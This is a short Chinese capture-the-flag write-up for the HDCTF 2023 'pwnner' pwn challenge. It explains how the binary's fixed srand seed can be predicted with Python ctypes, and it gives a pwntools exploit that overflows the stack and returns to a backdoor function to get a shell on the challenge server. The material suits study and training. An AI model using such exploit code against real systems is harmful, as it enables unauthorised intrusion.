[[HDCTF 2023]pwnner | NSSCTF](https://www.nssctf.cn/problem/3773)
先看题目
![[Pasted image 20240715214005.png]]
![[Pasted image 20240715214024.png]]
![[Pasted image 20240715214059.png]]
![[Pasted image 20240715214122.png]]
分析：开启NX保护，栈不可执行。有后门函数，为ret2text
buf不可溢出，溢出点为v3 要通过if的判断
查询wp后得知使用了伪随机srand(0x39u)

ps:atoi() 将字符串转为整型，如无法转则返回0

伪随机：当种子一定时，所产生的随机数序列是确定的。可以说srand后的随机数序列是伪随机数。
解决方法之一，调用ctypes库
[Python --- ctypes库的使用-CSDN博客](https://blog.csdn.net/freeking101/article/details/124982244)
[Python 使用 ctypes 调用 C/C++ DLL 动态链接库_ctypes.cdll-CSDN博客](https://blog.csdn.net/captain5339/article/details/126422798)


题解为：
```python
from pwn import *
from ctypes import *
p=remote("node5.anna.nssctf.cn",20676)

backdoor = 0x4008B2 #后门函数地址
context(arch = "amd64",os='linux',log_level='debug')
libc = cdll.LoadLibrary("libc.so.6")
libc.srand(0x39)

p.recvuntil(b"name")
p.sendline(str(libc.rand()).encode("utf-8"))
p.recvuntil(b"next?\n")

payload = b"A"*(0x40+8) + p64(0x40028b) + p64(backdoor)

p.sendline(payload)
p.interactive()
```





